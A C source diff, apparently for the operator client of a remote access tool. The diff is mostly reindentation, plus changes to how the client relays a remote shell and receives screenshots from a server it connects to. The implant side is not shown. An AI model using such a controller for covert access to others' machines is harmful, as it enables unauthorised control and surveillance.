@@ -19,22 +19,22 @@ extern int h_errno;
 
 
 char* read_input() {
-    char* in =  malloc(sizeof(char) * BUF_SIZE);
-    if (fgets(in, BUF_SIZE, stdin) == NULL) {
-        exit(1);
-    }
-    //printf("%s",in);
-    return in;
+	char* in =  malloc(sizeof(char) * BUF_SIZE);
+	if (fgets(in, BUF_SIZE, stdin) == NULL) {
+		exit(1);
+	}
+	//printf("%s",in);
+	return in;
 }
 
 int get_screenshot(int fd, int socket_desc)
 {
-	
+
 	char buffer[BUF_SIZE];
 	int n = 0;
 	while((n = read(socket_desc, buffer, BUF_SIZE)) > 0){
 		if(write(fd, buffer , n) < 0){
-			printf("receive _failed");
+			perror("receive _failed");
 			return 0;
 		}
 	}
@@ -46,49 +46,56 @@ int get_screenshot(int fd, int socket_desc)
 
 
 void handle_shell(int socket) {
-    while(1) {
-    	char car;
-    	read(0, &car, sizeof(char));
-    	write(socket, &car, sizeof(char));
-    }
-
+	if(fork() == 0){
+		char car;
+		while(1) {
+			read(0, &car, sizeof(char));
+			write(socket, &car, sizeof(char));
+		}
+	} else {
+		FILE *file = fdopen(socket, "r");
+		char buf[BUF_SIZE];
+		while(fgets(buf, BUF_SIZE, file) != NULL){
+			printf("%s", buf);
+			fflush(stdout);
+		}
+		exit(1);
+	}
 }
 
 
 void interact(int socket) {
 
-    printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n---FIN---\n");
-    char *input = read_input();
-    
-    int choix = 0; 
+	printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n---FIN---\n");
+	char *input = read_input();
+	int choix = 0; 
 
-    while ( choix == 0) {
-        
-        int i;
+	while ( choix == 0) {
 
-        for( i = 0; i < 3; i++) {
-            if ( strchr(input, i + '0') != NULL) {
-                choix = i;
-            }
-        }
-    }
-    free(input); 
+		int i;
 
-   write(socket, &choix, sizeof(int)); 
-    switch(choix) {
-    
-        case 1 : handle_shell(socket);
-        break;
-    	case 2: 
-		int fd;
-		fd = open("screenshot.png", O_CREAT | O_WRONLY | O_RDONLY);
-		if(fd < 0){
-			perror("file :");
-			exit(1);
+		for( i = 0; i < 3; i++) {
+			if ( strchr(input, i + '0') != NULL) {
+				choix = i;
+			}
 		}
-		get_screenshot(fd, socket);
-	break;
-    }
+	}
+	write(socket, input, BUF_SIZE); 
+	free(input); 
+	int fd;
+	switch(choix) {
+
+		case 1 : handle_shell(socket);
+			 break;
+		case 2: 
+			 fd = open("screenshot.png", O_CREAT | O_WRONLY | O_RDONLY, 0666);
+			 if(fd < 0){
+				 perror("file: ");
+				 exit(1);
+			 }
+			 get_screenshot(fd, socket);
+			 break;
+	}
 }
 
 
@@ -125,6 +132,6 @@ int main(int argc, char **argv) {
 		host = argv[1];
 	else
 		host = "localhost";
-        interact(connect_to_server(host));   
+	interact(connect_to_server(host));   
 	return 0;
 }
